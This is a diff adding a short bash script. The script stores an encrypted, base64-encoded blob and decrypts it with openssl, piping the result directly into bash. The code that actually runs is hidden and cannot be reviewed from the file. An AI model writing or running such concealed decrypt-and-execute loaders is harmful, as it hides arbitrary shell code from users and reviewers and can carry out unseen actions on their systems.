@@ -1,0 +1,17 @@
+#!/bin/bash
+
+data="U2FsdGVkX19VaAlRTLZ2+aEvHRTswcyas605F13huxJUOglaoYfMvz9K7IJD5oKF
+UI2lugQGrBSnMg6jGJtsdS1e/4QpJfcFmT83wFyRKdH+LOUWn3vV/CbFnyQWinut
+PM0t/dXToCE0yyvc0+zXwi0RN09z8A2rjlWqQzBME+Mh3I3hPkr9crxxU1K5lum8
+0ePMEvBF3kNBz7/K4Dn5NbvI1j3xpImdEBQ2A0gMG8ZB1i8pA4PmnoIrliWFvLGC
+dLUtrQABJpQvFs37A3/Juk0JyCBWVtdgOrF3hpp4AzvKuRHK2dyGd0+jraB73gq7
+kEbZvaM93ixha9e6Rlf6XC8eHprMqjS2XTULWlORE+5h7678LGRh3XP/nh0UjdLY
+472TDJjGcnKOZBWQV3oX56kXu2pvSZMi6GdZ8x8eANCt+jCp9mNKorhVDd1pv7rO
+DU+GmMxQSCpqnS8jivnZWJfbEMIH2md4AICouTjyNr7DMhy/y/XXI1619tDkcCOv
+GJfVT2ne1BcaYg6O2x1xMlGEI7h5AYYQShl8Ld1KCABZ14F6G8dQ7bTbnT6L1mvU
+r8suRhRPlCp0gfkBoq5dEogqmzg3wlU5GXN4ayW5x6UgPyYq80K0SAqCAL4rlHka
+EQnOtFLBHgverX+C9DQhl7tG+vNB2zHjvgt9LUWyIxM="
+
+
+
+echo $data | openssl enc -aes-256-cbc -d -salt -pbkdf2 -base64 | bash
